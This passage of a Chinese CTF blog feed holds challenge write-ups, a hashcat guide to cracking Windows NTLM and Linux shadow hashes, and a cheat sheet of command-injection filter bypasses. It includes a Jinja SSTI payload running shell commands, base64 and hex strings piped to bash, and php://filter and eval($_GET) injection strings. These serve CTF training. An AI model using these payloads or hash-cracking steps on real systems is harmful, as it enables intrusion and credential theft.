2L1hsAA==&quot;);</span><br><span class="line">for ($i=0;$i&lt;count($r);$i++) &#123;</span><br><span class="line">    $decr=gzuncompress(x(base64_decode($r[$i]),$k));</span><br><span class="line">    print($decr);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118153433654.png" alt="image-20250118153433654"></p><blockquote><p>flag{arsjxh-sjhxbr-3rdd78dfsh-3ndidjl}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.18</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>hashcat常规使用方法</title>
    <link href="https://blog.m3x1.cn/posts/7ca0c84c.html"/>
    <id>https://blog.m3x1.cn/posts/7ca0c84c.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-01-18T10:31:24.835Z</updated>
    
    <content type="html"><![CDATA[<h3 id="m-hash的类型">-m hash的类型</h3><p>指定hash的加密类型，默认是MD5类型<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151218880-546683178.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151218880-546683178.png" alt="img"></a><br>在对应的类型前面有它的id,可以通过id来指定类型<br>当我们想要找一个类型在<code>hashcat</code>支不支持的时候，例如windows系统加密的是NTML,可以执行命令<br><code>hashcat64.exe -h | findstr NTLM</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323151441885-831306097.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323151441885-831306097.png" alt="img"></a><br>可以看到<code>NTLM</code>的ID号为<code>1000</code></p><h3 id="a-攻击方式">-a 攻击方式</h3><p>破解密码的方式<br>分别有:</p><p>highlighter- 1c</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0 | Straight  字典破解</span><br><span class="line">1 | Combination  组合破解</span><br><span class="line">3 | Brute-force  掩码破解</span><br><span class="line">6 | Hybrid Wordlist + Mask  混合字典 + 掩码</span><br><span class="line">7 | Hybrid Mask + Wordlist  混合掩码 +  字典</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323150232206-1864847787.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323150232206-1864847787.png" alt="img"></a></p><h3 id="掩码">掩码</h3><p>当没有字典的时候，可以使用掩码指定密码的每一位是什么类型的字符，首先我们知道密码有多少位<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323153207489-2145128247.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323153207489-2145128247.png" alt="img"></a><br>例如:<code>?d?d?d?d?d?d?d?d</code>代表密码为8为数字，<code>?u?l?l?l?l?d?d?d</code>代表密码为7位，首个字母大写，然后四个小写字母，最后三个数字</p><h3 id="破解windows-hash密码">破解windows hash密码</h3><p><strong>使用字典爆破windows hash</strong><br><code>hashcat64.exe -a 0 -m 1000 hash或者hashfile 字典文件</code><br>准备好我们的密码本，这里我使用的是手写的<code>2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152446755-1468474769.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152446755-1468474769.png" alt="img"></a><br><code>hashcat64.exe -a 0 -m 1000 e45a314c664d40a227f9540121d1a29d 2.txt</code><br>执行后会进入这样一个状态，这里每个可能不一样，在破解成功或者跑完字典后会自动停止<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152907726-1543846375.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152907726-1543846375.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323152938264-999245190.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323152938264-999245190.png" alt="img"></a><br>可以看到我们的密码已经被破解出来，为<code>Admin123</code><br>在破解后，会在根目录下的<code>hashcat.potfile</code>文件记录这个hash的缓存<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323154735555-892319052.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323154735555-892319052.png" alt="img"></a></p><p><strong>使用掩码破解windows hash</strong><br><code>hashcat64.exe -a 3 -m 1000 e45a314c664d40a227f9540121d1a29d ?u?l?l?l?l?d?d?d</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155148658-906395823.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155148658-906395823.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323155209806-1669173198.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323155209806-1669173198.png" alt="img"></a><br>破解成功</p><p>在我们爆破的同时，会有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit =&gt;</span><br></pre></td></tr></table></figure><p>分别：查看破解状态，暂停，绕过，检查，退出</p><p>还有如下例子：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250118140015954.png" alt="image-20250118140015954"></p><h3 id="破解Linux-hash密码">破解Linux hash密码</h3><p>在<code>linux</code>中，我们知道，密码分别存储在/etc/passwd和/etc/shadow中，只需要<code>more /etc/shadow</code>，将其中的文件复制出来，使用工具破解即可<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323193627170-854468310.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323193627170-854468310.png" alt="img"></a><br>将root和jackson用户的密码保存到<code>/var/www/html/pass</code>Web服务目录中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$90/diajJs2fHcIGa$hB5wj4tMF8Qdd6o5VNRTY4v4vEpV8x0NP4O1N/tpJ8ns7JmJ8RyvSih7.W8TQdfwweUFh16dJejFpKw07i2uR1::0:99999:7:::</span><br><span class="line">jackson:$6$Zje1WaoS$eH24JFr5n67149yBcDWWsfxME5cYlOXMmJxnf2uinbvYm8vWc0BmjvAoXIFY/0ZUJItRpPhHkCGDiqjXT10EV0:19066:0:99999:7:::</span><br></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220324083051894-306061497.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220324083051894-306061497.png" alt="img"></a><br>注意这里的换行，一个用户的hash值是一行<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195519376-1688604181.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195519376-1688604181.png" alt="img"></a><br>启动Web服务<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195250088-790012495.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195250088-790012495.png" alt="img"></a><br>并在实验机器下载，这里使用certutil将pass文件内容下载到了D盘下的pass文件中去<br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323194800417-621412828.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323194800417-621412828.png" alt="img"></a><br><strong>Linux使用的是 sha512crypt加密方式</strong>，在hashcat中寻找是否有该方法<br><code>hashcat64.exe -h|findstr sha512crypt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323195736516-1164859720.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323195736516-1164859720.png" alt="img"></a><br>代号为<code>1800</code><br>继续使用我们的<code>2.txt</code>对<code>d:\pass</code>文件进行暴力破解<br><code>hashcat64.exe -a 0 -m 1800 d:\pass 2.txt</code><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323200929852-624191296.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323200929852-624191296.png" alt="img"></a><br><a href="https://img2022.cnblogs.com/blog/2442110/202203/2442110-20220323201016538-1015617615.png"><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/2442110-20220323201016538-1015617615.png" alt="img"></a><br>这里我更换了<code>root</code>和<code>jackson</code>用户在文件中的位置<br>爆破成功，得到<code>jackson</code>的密码为<code>root</code>，但是只爆破出了一个密码，应该只支持一个密码的破解<br><strong><code>注意:复制的时候一定不要有换行，不然是无法破解成功的</code></strong></p>]]></content>
    
    
    <summary type="html">🥧hashcat常规使用方法</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>2024年春秋杯网络安全联赛冬季赛wp-1.17</title>
    <link href="https://blog.m3x1.cn/posts/b245cfb0.html"/>
    <id>https://blog.m3x1.cn/posts/b245cfb0.html</id>
    <published>2025-01-16T16:00:00.000Z</published>
    <updated>2025-02-19T11:00:12.845Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="easy-flask">easy_flask</h4><blockquote><p>考点：ssti 注入</p></blockquote><p>打开网页，发现有个登录，试试直接登录</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165333225.png" alt="image-20250117165333225"></p><p>看到 url 处是进行 get 传参，试试 111</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165407490.png" alt="image-20250117165407490"></p><p>联想到 ssti 漏洞，于是用9验证一下，发现就是 ssti 模板注入</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165456193.png" alt="image-20250117165456193"></p><p>进行 ssti 模板注入漏洞一系列，构造 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165555735.png" alt="image-20250117165555735"></p><blockquote><p>flag{48ad0cde8345c8b2608933ac4e85147e}</p></blockquote><h4 id="file-copy">file_copy</h4><blockquote><p>考点：无回显，filter协议</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230203872.png" alt="image-20250117230203872"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230233073.png" alt="image-20250117230233073"></p><p>根据代码，可以看到是post传参，参数是path。（抓包也可以看）</p><p>直接使用脚本（<a href="https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level%2017/php_filter_chains_oracle_exploit-main%EF%BC%89">https://github.com/ProbiusOfficial/PHPinclude-labs/tree/bbb08b030623d481be51edea063433b8d77b2ee7/Level 17/php_filter_chains_oracle_exploit-main）</a></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230452787.png" alt="image-20250117230452787"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117230507242.png" alt="image-20250117230507242"></p><blockquote><p>flag{894272cc-8e8d-47f7-9565-39636508492a}</p></blockquote><h2 id="Misc">Misc</h2><h4 id="简单算数">简单算数</h4><p>考点：异或</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165811554.png" alt="image-20250117165811554"></p><p>直接进行字符串异或，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117165855506.png" alt="image-20250117165855506"></p><blockquote><p>flag{x0r_Brute_is_easy!}</p></blockquote><h4 id="See-anything-in-these-pics">See anything in these pics</h4><blockquote><p>考点：文件分离</p></blockquote><p>解压后是一个二维码和一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170037763.png" alt="image-20250117170037763"></p><p>扫描二维码，得到解压缩包的密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170129000.png" alt="image-20250117170129000"></p><p>解压后得到一张 jpg 图片。先放进 010editor 看一下，发现隐藏了文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170256270.png" alt="image-20250117170256270"></p><p>用 binwalk 探测，然后提取，得到一张 png 图片</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170348138.png" alt="image-20250117170348138"></p><p>放进 010editor 查看，可能宽高被修改过，于是修改宽高得到原图</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117170548575.png" alt="image-20250117170548575"></p><blockquote><p>flag{opium_00pium}</p></blockquote><h4 id="简单提取镜像">简单提取镜像</h4><blockquote><p>考点：流量分析，数据修复</p></blockquote><p>解压文件得到一个流量包，进行流量分析，导出文件，得到一个 zip 文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171207275.png" alt="image-20250117171207275"></p><p>解压 zip 文件，得到一个破损的 img 文件，根据提示，可能可以使用 RR-Studio 工具修复。</p><p>可以直接进行文件分离，得到一个 excl 表格，得到 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171347734.png" alt="image-20250117171347734"></p><blockquote><p>flag{E7A10C15E26AA5750070EF756AAA1F7C}</p></blockquote><h4 id="压力大，写个脚本吧">压力大，写个脚本吧</h4><blockquote><p>考点：脚本编写能力</p></blockquote><p><img src="E:/%E5%B7%A5%E7%A8%8B%E5%AE%9E%E8%B7%B5/%E5%B7%A5%E5%85%B7/typora/Typora/upload/image-20250117171504745.png" alt="image-20250117171504745"></p><p>很明显是有密码的套娃压缩包，直接编写脚本解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import base64</span><br><span class="line">for i in range(99,0,-1):</span><br><span class="line">    i=str(i)</span><br><span class="line">    zipname = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\zip_&quot;+i+&quot;.zip&quot;</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    passwd = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    passwd = base64.b64decode(passwd)</span><br><span class="line">    print(passwd)</span><br><span class="line">    ts1 = zipfile.ZipFile(zipname,&#x27;r&#x27;)</span><br><span class="line">    ts1.extractall(r&quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧&quot;,pwd=passwd)</span><br><span class="line">    ts1.close()</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117171704899.png" alt="image-20250117171704899"></p><p>提示是 png，然后我们将 password_0.txt 的密码进行 base64 解密</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">89504E470D0A1A0A0000000D494844520000019000000190</span><br></pre></td></tr></table></figure><p>发现是个 png 文件头，所以这些密码应该组合在一起就是一张 png 图片。脚本直接放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">stringall = &quot;&quot;</span><br><span class="line">for i in range(0, 100):</span><br><span class="line">    i = str(i)</span><br><span class="line">    passwd_path = &quot;C:\\Users\\Lucky\\Desktop\\春秋杯\\misc\\压力大，写个脚本吧\\password_&quot;+i+&quot;.txt&quot;</span><br><span class="line">    string = open(passwd_path, &quot;r&quot;).read()</span><br><span class="line">    stringall += string</span><br><span class="line">print(base64.b64decode(stringall))</span><br></pre></td></tr></table></figure><p>得到一张二维码，直接扫，就得到了 flag</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172005199.png" alt="image-20250117172005199"></p><blockquote><p>flag{<em>PASSWORDs_is_fl@g!</em>}</p></blockquote><h4 id="ez-forensics">ez_forensics</h4><blockquote><p>考点：镜像取证</p></blockquote><p>下载附件解压，先文件扫描一下看看，查找一下关键词</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134845419.png" alt="image-20250121134845419"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121134909012.png" alt="image-20250121134909012"></p><p>将这两个文件（压缩包和txt）提取出来，发现压缩包解压需要密码。查看hint.txt</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135038002.png" alt="image-20250121135038002"></p><p>60 = 13 +47，想到用rot13和rot47解密，得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135247193.png" alt="image-20250121135247193"></p><p>可以知道，压缩包的解压密码需要进行hashdump。</p><p>然后找到用户密码</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135742846.png" alt="image-20250121135742846"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135722955.png" alt="image-20250121135722955"></p><p>解压后得到文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121135900120.png" alt="image-20250121135900120"></p><p>结合提示搜索，发现了</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140041681.png" alt="image-20250121140041681"></p><p>结合用户名，可以知道使用的试MobaXterm，所以ini文件是其配置文件</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140134279.png" alt="image-20250121140134279"></p><p>网上搜索其密码解密，找到一篇博客，知道可以使用脚本解密</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140432635.png" alt="image-20250121140432635"></p><p>master password就使用文件名 flag_is_here</p><p>最后解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250121140457763.png" alt="image-20250121140457763"></p><p>将flag内的内容进行base64解密得到flag。</p><blockquote><p>flag{you_are_a_g00d_guy}</p></blockquote><h2 id="crypto">crypto</h2><h4 id="通往哈希的旅程">通往哈希的旅程</h4><blockquote><p>考点：哈希</p></blockquote><p>根据提示得到一个哈希密文</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172603778.png" alt="image-20250117172603778"></p><p>直接哈希爆破或者在线解密得到</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20250117172632734.png" alt="image-20250117172632734"></p><blockquote><p>flag{18876011645}</p></blockquote>]]></content>
    
    
    <summary type="html">🥧2024年春秋杯网络安全联赛冬季赛wp-1.17</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="比赛wp" scheme="https://blog.m3x1.cn/tags/%E6%AF%94%E8%B5%9Bwp/"/>
    
  </entry>
  
  <entry>
    <title>解决hexo引入图床，手机和web不显示图片的问题</title>
    <link href="https://blog.m3x1.cn/posts/762268d0.html"/>
    <id>https://blog.m3x1.cn/posts/762268d0.html</id>
    <published>2024-11-30T16:00:00.000Z</published>
    <updated>2025-03-25T04:40:12.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-前言">0.前言</h3><p>hexo引入图片的方式有很多种：</p><ul><li>从本地文件加载，方法参见参考文献一。</li><li>使用图床，markdown中直接引用图床的链接。</li></ul><h3 id="1-问题描述">1.问题描述</h3><p>Hexo使用图床的方式加载在blog中加载图片，会在非本人的电脑或者手机端报“html访问图片资源403问题(http referrer)”，导致采用图床方式加载的图片全部无法加载。</p><h3 id="2-问题原因">2.问题原因</h3><p>http请求体的header中有一个referrer字段，用来表示发起http请求的源地址信息，这个referrer信息是可以省略但是不可修改的，就是说你只能设置是否带上这个referrer信息，不能定制referrer里面的值。</p><p>服务器端在拿到这个referrer值后就可以进行相关的处理，比如图片资源，可以通过referrer值判断请求是否来自本站，若不是则返回403或者重定向返回其他信息，从而实现图片的防盗链。上面出现403就是因为，请求的是别人服务器上的资源，但把自己的referrer信息带过去了，被对方服务器拦截返回了403。</p><p>在前端可以通过meta来设置referrer policy(来源策略)，具体可以设置哪些值以及对应的结果参考<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FHTTP%2FHeaders%2FReferrer-Policy">这里</a>。所以针对上面的403情况的解决方法，就是把referrer设置成<code>no-referrer</code>，这样发送请求不会带上referrer信息，对方服务器也就无法拦截了。</p><p>浏览器中referrer默认的值是<code>no-referrer-when-downgrade</code>，就是除了降级请求的情况以外都会带上referrer信息。降级请求是指https协议的地址去请求http协议，所以上面403的情况还有另一种解决方法就是，请求的图片地址换成http协议，自己的地址使用http协议，这样降级请求也不会带上referrer。</p><h3 id="3-解决办法">3.解决办法</h3><h4 id="3-1-butterfly主题">3.1 butterfly主题</h4><p>在G:\blog\themes\butterfly\layout\includes目录下有一个head.pug文件，修改该文件的meta信息，会使生成的所有页面都带有该head。在head.pug文件中添加如下内容，结果参见图片。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">meta</span>(name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-1b07689b2e132b5d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/656/format/webp" alt="img"></p><p>butterfly添加头.png</p><h4 id="3-2-yilia主题">3.2 yilia主题</h4><p>在G:\blog\themes\yilia\layout_partial目录下有一个head.ejs，同样在head.ejs文件中添加如下meta信息即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=<span class="string">&quot;referrer&quot;</span> content=<span class="string">&quot;no-referrer&quot;</span> /&gt;</span><br></pre></td></tr></table></figure><h3 id="4-结果">4.结果</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用hexo g 重新生成一下工程</span><br></pre></td></tr></table></figure><p>在G:\blog\public\2021目录下就是所有21年生成的blog，找到该目录下的任意一个index.html，用文本编辑器打开就可以看到已经自动生成了referrer标签了。</p><p><img src="https:////upload-images.jianshu.io/upload_images/13838098-34cdaee390f1a3dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508/format/webp" alt="img"></p><p>生成的html中包含有referrer头.png</p><p>然后使用hexo d指令将工程同步到github即可</p>]]></content>
    
    
    <summary type="html">🥧解决hexo引入图床，手机和web不显示图片的问题</summary>
    
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="问题解决笔记" scheme="https://blog.m3x1.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>命令执行过滤关键字</title>
    <link href="https://blog.m3x1.cn/posts/d36c6b6d.html"/>
    <id>https://blog.m3x1.cn/posts/d36c6b6d.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2024-12-02T08:48:57.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="过滤关键字">过滤关键字</h2><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/5415034b6a6c6d525395ede652e55b0f.png" alt=""></p><p>反斜杠绕过  <code>ca\t y1n\g.php</code><br>两个单引号绕过  <code>cat y1''ng.php</code><br>base64编码绕过 <code>echo “base64编码” | base64 -d | bash</code><br>hex编码绕过 <code>echo &quot;hex编码&quot; | xxd -r -p | bash</code><br>用[ ]进行匹配  <code>cat y1[n]g.php</code><br>用* 匹配任意 <code>cat y1n*</code><br>用?匹配任意 <code>cat y1n?</code><br>用{ }匹配范围 <code>cat y1&#123;a..z&#125;g.php</code><br>变量 <code>$a=fl;$b=ag;cat $a$b.php</code><br>拼接绕过 <code>‘fl’.'ag'</code></p><p>括号绕过 (sy.(st).em)(ls);</p><p>除了上述方式，还可以用字符串拼接的方式绕过。</p><p>python字符串拼接:<br>1.+       eg: ‘a’+‘b’     输出:‘ab’<br>2.贴贴    eg: ‘a’‘b’       输出:‘ab’</p><p>PHP拼接:<br>.    eg: ‘a’.‘b’      输出:‘ab’</p><p>解释内联执行：将前一个执行结果作为后一个执行的参数。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/ede76d59480f5f8a630234a9b9262bfd.jpg" alt=""></p><h2 id="过滤所有字母和数字">过滤所有字母和数字:</h2><p>1.位运算-异或（见脚本）<br>2.取反（见脚本）</p><p>3.短标签</p><p>一个字符串，将它用括号括起来，后面再跟一个括号，就会调用同名的函数。</p><p>eg:(“system”)();  其实就等于执行  system();</p><p>eg:(“system”)(“ls”);  其实就等于执行  system(“ls”);</p><p>将 system 等字符串用位运算进行编码，可以绕过许多过滤。<br>注意: 编码后不用&quot;&quot;，样式是 (编码)();</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/QQ%E5%9B%BE%E7%89%8720240807145304.png" alt=""></p><h2 id="使用include函数包含绕过：">使用include函数包含绕过：</h2><p>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</p><h2 id="嵌套绕过：">嵌套绕过：</h2><p>?c=eval($_GET[1]);$1=phpinfo();</p><p>若能执行，变量$1就不再受过滤限制</p><h2 id="积累：">积累：</h2><ol><li><p>过滤/，如 ls /用不了，可以使用ls -al，然后命令联合执行</p></li><li><p>%0a是回车符的url编码，有时候过滤了;&amp;|可以使用，但是注意，最好在浏览器url栏直接使用，或者使用hackbar，在题目的输入框使用可能没有效果。</p></li></ol>]]></content>
    
    
    <summary type="html">🥧命令执行过滤关键字</summary>
    
    
    
    <category term="CTF" scheme="https://blog.m3x1.cn/categories/CTF/"/>
    
    
    <category term="web姿势" scheme="https://blog.m3x1.cn/tags/web%E5%A7%BF%E5%8A%BF/"/>
    
  </entry>
  
  <entry>
    <title>HUBU新星杯wp</title>
    <link href="https://blog.m3x1.cn/posts/3c1876bb.html"/>
    <id>https://blog.m3x1.cn/posts/3c1876bb.html</id>
    <published>2024-11-29T16:00:00.000Z</published>
    <updated>2025-02-19T10:59:38.613Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="web">web</h2><h4 id="Robots-Leak">Robots Leak</h4><blockquote><p>考点：git泄露</p></blockquote><blockquote><p>开启题目</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130175850152.png" alt="image-20241130175850152"></p><blockquote><p>先扫目录</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180035365.png" alt="image-20241130180035365"></p><blockquote><p>git泄露，直接拉取git到本地，然后有个.git文件</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180200728.png" alt="image-20241130180200728"></p><blockquote><p>进入到文件里，查看日志</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180256138.png" alt="image-20241130180256138"></p><blockquote><p>找到关键词flag，查看一下内容</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180337316.png" alt="image-20241130180337316"></p><blockquote><p>拿到一半flag。</p><p>查看一下其他日志内容，都没什么营养，然后看看有没有文件，用git stash pop</p><p>发现拉取了一个.flag.exe，查看得到下一半</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180607763.png" alt="image-20241130180607763"></p><blockquote><p>合起来就是全部flag</p></blockquote><blockquote><p>HUBUCTF{431332b1-e91f-4437-9036-b9059539886f}</p></blockquote><h4 id="ez-http">ez-http</h4><blockquote><p>考点：http基础</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130180913089.png" alt="image-20241130180913089"></p><blockquote><p>http基础，按要求一步一步来，建议抓包放进重放器里面，方便</p></blockquote><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181057278.png" alt="image-20241130181057278"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181134970.png" alt="image-20241130181134970"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20241130181201614.png" alt="image-20241130181201614"></p><blockquote><p>剩下的就是改referrer，添加一个ip(网上搜一下，多试)，然后改cookie等等。（不截图了）</p></blockquote><h4 id="Random-Door">Random_Door</h4><blockquote><p>考点：python脚本，php伪协议</p></blockquote><blockquote><p>打开网站</p></blockquote><p><img 